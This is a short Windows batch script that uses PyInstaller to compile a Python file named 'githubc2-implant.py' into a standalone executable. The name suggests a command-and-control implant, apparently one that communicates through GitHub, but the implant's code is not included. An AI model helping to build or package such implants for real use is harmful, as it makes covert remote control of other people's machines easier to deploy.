@echo off
echo Generating executable from Python script...
"C:\Users\Hassa\AppData\Roaming\Python\Python311\Scripts\pyinstaller.exe" --onefile githubc2-implant.py
echo Executable has been created in the dist folder.